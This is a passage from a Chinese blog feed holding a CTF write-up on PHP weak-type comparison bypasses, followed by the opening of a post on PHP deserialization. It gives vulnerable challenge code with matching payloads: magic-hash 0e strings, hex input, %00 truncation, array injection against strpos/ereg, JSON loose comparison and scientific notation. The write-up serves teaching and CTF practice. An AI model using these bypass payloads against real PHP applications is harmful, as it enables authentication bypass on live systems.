class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br></pre></td></tr></table></div></figure>        <h2 id="9-十六进制与数字比较"   >          <a href="#9-十六进制与数字比较" class="heading-link"><i class="fas fa-link"></i></a><a href="#9-十六进制与数字比较" class="headerlink" title="9. 十六进制与数字比较"></a>9. 十六进制与数字比较</h2>      <p><span class="exturl"><a class="exturl__link"   href="http://123.206.87.240:9009/20.php" >http://123.206.87.240:9009/20.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function">function <span class="title">noother_says_correct</span><span class="params">($temp)</span> </span>&#123;</span><br><span class="line">$flag = &#x27;flag&#123;test&#125;&#x27;;</span><br><span class="line">$one = ord(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line">$nine = ord(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line"><span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line">$number = &#x27;3735929054&#x27;;</span><br><span class="line"><span class="comment">// Check all the input characters!</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="built_in">strlen</span>($number); $i++) &#123;</span><br><span class="line"><span class="comment">// Disallow all the digits!</span></span><br><span class="line">$digit = ord($temp &#123;$i&#125;);</span><br><span class="line"><span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123;</span><br><span class="line"><span class="comment">// Aha, digit not allowed!</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;flase&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($number == $temp)</span><br><span class="line"><span class="keyword">return</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp = $_GET[&#x27;password&#x27;];</span><br><span class="line"><span class="function">echo <span class="title">noother_says_correct</span><span class="params">($temp)</span></span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure><p>参数不能有1-9的数字，同时要求该参数值为3735929054，所以把值转换成十六进制传参。</p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?password=<span class="number">0xdeadc0de</span></span><br></pre></td></tr></table></div></figure><p><img   src="https://img-blog.csdnimg.cn/20201102122943381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>        <h2 id="10-ereg正则-00截断"   >          <a href="#10-ereg正则-00截断" class="heading-link"><i class="fas fa-link"></i></a><a href="#10-ereg正则-00截断" class="headerlink" title="10. ereg正则%00截断"></a>10. ereg正则%00截断</h2>      <p><span class="exturl"><a class="exturl__link"   href="http://123.206.87.240:9009/5.php" >http://123.206.87.240:9009/5.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line">if (isset ($_GET[&#x27;password&#x27;])) &#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) &#123;</span><br><span class="line">echo &#x27;You password must be alphanumeric&#x27;;</span><br><span class="line">&#125; else if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999) &#123;</span><br><span class="line">if (strpos ($_GET[&#x27;password&#x27;], &#x27;-&#x27;) !== FALSE) //strpos — 查找字符串首次出现的位置 &#123;</span><br><span class="line">die(&#x27;Flag: &#x27; . $flag);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">echo(&#x27;have not been found&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">echo &#x27;Invalid password&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure><p>传入的值必须是数字或大小写字符，长度小于8且大于9999999,且匹配到”<em>-</em>“才能输出flag。</p><p>可以使用<code>%00</code>来截断，当ereg函数读到 <code>%00</code>的时候，就截止了。</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?password=<span class="number">1e8</span>%<span class="number">00</span>*-*</span><br></pre></td></tr></table></div></figure><p><img   src="https://img-blog.csdnimg.cn/20201102124459121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>        <h2 id="11-strpos数组绕过"   >          <a href="#11-strpos数组绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#11-strpos数组绕过" class="headerlink" title="11. strpos数组绕过"></a>11. strpos数组绕过</h2>      <p><span class="exturl"><a class="exturl__link"   href="http://123.206.87.240:9009/15.php" >http://123.206.87.240:9009/15.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">if (isset ($_GET[&#x27;ctf&#x27;])) &#123;</span><br><span class="line">if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;ctf&#x27;]) === FALSE)</span><br><span class="line">     echo &#x27;必须输入数字才行&#x27;; </span><br><span class="line">else if (strpos ($_GET[&#x27;ctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE)</span><br><span class="line">     die(&#x27;Flag: &#x27;.$flag); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">     echo &#x27;骚年，继续努力吧啊~&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure><p>要求传入的参数为数字并且包含字符串“#biubiubiu”，有点难搞。</p><p>可以通过数组绕过<code>strpos</code>与<code>ereg</code>函数，遇到数组返回NULL，数值和类型相同。</p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?ctf[]=<span class="number">1</span></span><br></pre></td></tr></table></div></figure><p><img   src="https://img-blog.csdnimg.cn/20201102125444628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>        <h2 id="12-数字验证正则绕过"   >          <a href="#12-数字验证正则绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#12-数字验证正则绕过" class="headerlink" title="12. 数字验证正则绕过"></a>12. 数字验证正则绕过</h2>      <p><span class="exturl"><a class="exturl__link"   href="http://123.206.87.240:9009/21.php" >http://123.206.87.240:9009/21.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = &#x27;flag&#123;test&#125;&#x27;;</span><br><span class="line">if (&quot;POST&quot; == $_SERVER[&#x27;REQUEST_METHOD&#x27;]) &#123;</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line">if (0 &gt;= preg_match(&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;, $password)) //preg_match — 执行一个正则表达式匹配 &#123;</span><br><span class="line">echo &#x27;flag&#x27;;</span><br><span class="line"><span class="built_in">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">$reg = &#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">$c = <span class="number">0</span>;</span><br><span class="line">$ps = array(&#x27;punct&#x27;, &#x27;digit&#x27;, &#x27;upper&#x27;, &#x27;lower&#x27;);</span><br><span class="line"><span class="comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span></span><br><span class="line">foreach ($ps as $pt) &#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/[[:$pt:]]+/&quot;</span>, $password))</span><br><span class="line">$c += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//&gt;=3，必须包含四种类型三种与三种以上</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;42&quot;</span> == $password) </span><br><span class="line">              echo $flag; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">              echo &#x27;Wrong password&#x27;;</span><br><span class="line"><span class="built_in">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure><p>代码中涉及到的一些正则函数<br>| 正则匹配函数   | 描述                                                         | 区别                       |<br>| ————– | ———————————————————— | ————————– |<br>| preg_match     | 执行一个正则表达式匹配，匹配到则返回1，匹配不到则返回0       | 第一次匹配成功后就停止匹配 |<br>| preg_match_all | 执行一个全局正则表达式匹配，返回成功模式匹配的次数，并将匹配结果存储到一个数组中 | 匹配到字符串结束为止       |</p><p>下面还有几个正则匹配的字符：<br>| 正则匹配字符  | 描述 |ASCII|<br>|–|–|–|<br>| [:graph:] |除空格，TAB外的所有字符 |[\x21-\x7E]<br>|[a-zA-Z0-9]|大小写字母和数字 |[a-zA-Z0-9]<br>|[:alpha:]|大小写字母|    [a-zA-Z]|<br>| [:punct:] | 任何标点符号|[!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{} ~]|<br>| [:digit:] |任何数字 |[0-9]<br>| [:upper:] |任何大写字母 |[A-Z]<br>| [:lower:] |任何小写字母 |[a-z]</p><p>代码审计</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">请求方法必须为POST</span><br><span class="line"><span class="number">1</span>、正则匹配，[:graph:]为任意字符，要求password长度超过<span class="number">12</span></span><br><span class="line"><span class="number">2</span>、password中必须包含标点符号，数字，大写字母，小写字母，并且检测次数要超过<span class="number">6</span>次</span><br><span class="line"><span class="number">3</span>、标点符号，数字，大写字母，小写字母，包含<span class="number">3</span>种以上绕过</span><br><span class="line"><span class="number">4</span>、弱类型比较，42abc,强制转换为数字</span><br></pre></td></tr></table></div></figure><p>构造Payload，居然提示<code>Wrong password</code></p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: password=42BugKuctf.a</span><br></pre></td></tr></table></div></figure><p><img   src="https://img-blog.csdnimg.cn/20201103190435176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"><br>仔细看了一下代码，变量原来是flag，改一下Payload</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: flag=42BugKuctf.a</span><br></pre></td></tr></table></div></figure><p><img   src="https://img-blog.csdnimg.cn/2020110318591559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p><p>这道题有点奇怪，随便post一个值也能得到flag，小小脑袋有大大疑问。<br><img   src="https://img-blog.csdnimg.cn/20201103185441793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>        <h2 id="13-md4绕过"   >          <a href="#13-md4绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#13-md4绕过" class="headerlink" title="13.md4绕过"></a>13.md4绕过</h2>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>] != hash(<span class="string">&quot;md4&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>])) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Theshy is locked&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>这段代码中get进来的参数a，使<code>a=md4(a)</code>才行。</p><p>百度一下md4绕过，发现可以通过科学计算法比较绕过。找一个值是一个科学计算法0e开头的，其md4加密后也为0e开头，弱类型比较绕过。</p><div class="table-container"><table><thead><tr><th>a</th><th>md4(a)</th></tr></thead><tbody><tr><td>0e251288019</td><td>0e874956163641961271069404332409</td></tr><tr><td>0e001233333333333334557778889</td><td>0e434041524824285414215559233446</td></tr><tr><td>Payload为：</td><td></td></tr></tbody></table></div><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?a=<span class="number">0e251288019</span></span><br><span class="line">或</span><br><span class="line">?a=<span class="number">0e001233333333333334557778889</span></span><br></pre></td></tr></table></div></figure>        <h2 id="14-json绕过"   >          <a href="#14-json绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#14-json绕过" class="headerlink" title="14.json绕过"></a>14.json绕过</h2>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = json_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">&quot;*********&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;~~~~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>输入一个数组进行json解码，解码后的message与key值相同才会得到flag，使用弱类型进行绕过，key肯定是字符串，两个等号时会转化成同一类型再进行比较，直接构造一个0就可以相等了，通过0==”admin”这种形式绕过。</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: message=&#123;<span class="string">&quot;key&quot;</span>:<span class="number">0</span>&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="15-科学计数法绕过"   >          <a href="#15-科学计数法绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#15-科学计数法绕过" class="headerlink" title="15.科学计数法绕过"></a>15.科学计数法绕过</h2>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login&quot;</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;yingzi&#x27;</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;[a-zA-Z0-9]&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;yingzi&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;give you flag)&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;yingzi&#x27;</span>]) &lt; <span class="number">10</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;yingzi&#x27;</span>] &gt; <span class="number">987654321</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (strpos(<span class="variable">$_POST</span>[<span class="string">&#x27;yingzi&#x27;</span>], <span class="string">&#x27;#BIG#&#x27;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$_POST</span>[<span class="string">&#x27;yingzi&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;./flag.php&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Congratulations! FLAG is : &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>代码审计：</p><p>1.isset函数，POST传入参数login和yingzi。<br>2.strlen函数，参数yingzi的值长度小于10，且数值大于987654321。<br>3.strpos函数，参数yingzi的值是否匹配<code>#BIG#</code>，如果有，则包含一个flag.php文件，输出flag。</p><p>使用科学计数法绕过strlen函数，令yingzi=e9，此时strlen=3，为了匹配<code>#BIG#</code>，所以yingzi=1e9#BIG#</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: login=<span class="number">1</span>&amp;yingzi=<span class="number">1e9</span><span class="comment">#BIG#</span></span><br></pre></td></tr></table></div></figure><p><img   src="https://img-blog.csdnimg.cn/20210201120107109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：PHP弱类型绕过方法&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞" scheme="https://swhat.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="PHP" scheme="https://swhat.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>浅谈PHP反序列化漏洞</title>
    <link href="https://swhat.github.io/2020/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://swhat.github.io/2020/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-10-18T07:44:31.000Z</published>
    <updated>2021-02-03T07:56:10.051Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：PHP反序列化</p> <a id="more"></a>        <h2 id="PHP序列化"   >          <a href="#PHP序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP序列化" class="headerlink" title="PHP序列化"></a>PHP序列化</h2>      <blockquote><p>序列化是将变量转换为可保存或传输的字符串的过程。</p></blockquote><p>函数  <code>serialize()</code>，可将变量转换为字符串并且在转换中保存当前变量的值。<br>序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。php允许保存一个对象方便以后重用，这个过程被称为序列化。<br>我们先建一个Test对象，存入信息，然后直接输出对象</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;admins&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$m</span>=<span class="keyword">new</span> Test();</span><br><span class="line">    print_r(<span class="variable">$m</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>运行结果：</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span 